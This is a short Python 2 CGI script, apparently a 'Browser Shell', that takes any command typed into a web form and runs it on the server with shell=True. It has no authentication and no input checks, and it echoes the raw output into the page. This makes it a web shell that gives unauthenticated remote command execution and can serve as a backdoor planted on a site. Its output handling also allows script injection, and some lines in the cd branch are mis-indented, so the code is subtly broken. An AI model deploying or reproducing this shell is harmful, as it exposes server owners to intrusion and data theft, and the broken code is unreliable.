#!/usr/bin/env python

import cgi, shlex, sys, os
import cgitb; cgitb.enable()  # for troubleshooting
import subprocess

print "Content-type: text/html"
print

print """
<html>

<head><title>pysh</title></head>

<body>
"""

form = cgi.FieldStorage()
command = form.getvalue("command", "")
#currPath = subprocess.Popen(['pwd'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) 
pwd = form.getvalue("pwd","")

if pwd == "":
  pwd = os.getcwd()


os.chdir(pwd)
commandSplit = shlex.split(command)

result = ""

#if (len(pwd) == 0):
#  pwd = os.getcwd()
 
newPath = pwd
if (len(commandSplit) > 0):
  if (commandSplit[0].lower() == 'cd'):
    #check the path to go to:
    if (len(commandSplit) > 1):
      if (commandSplit[1][0] == '/'):
    newPath = str(commandSplit[1])
      else:
    newPath = os.getcwd() + "/" + str(commandSplit[1])
    else:
      newPath = os.getcwd()
  else:
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) 
    for line in p.stdout.readlines():
      result = result + line
print "%s" %newPath



print """
  <div align="center">Browser Shell</div>
  <div>%s</div>
  <div>
    <form>
      <p>$ <input type="text" name="command" /></p>
<p><input type="hidden" name="pwd" value="%s" /></p>
</form>
  </div>
  <div>
    <BR>Command result:<BR>
    <pre>
    %s
    </pre>
  </div>
</body>

</html>
""" % (commandSplit,newPath,result)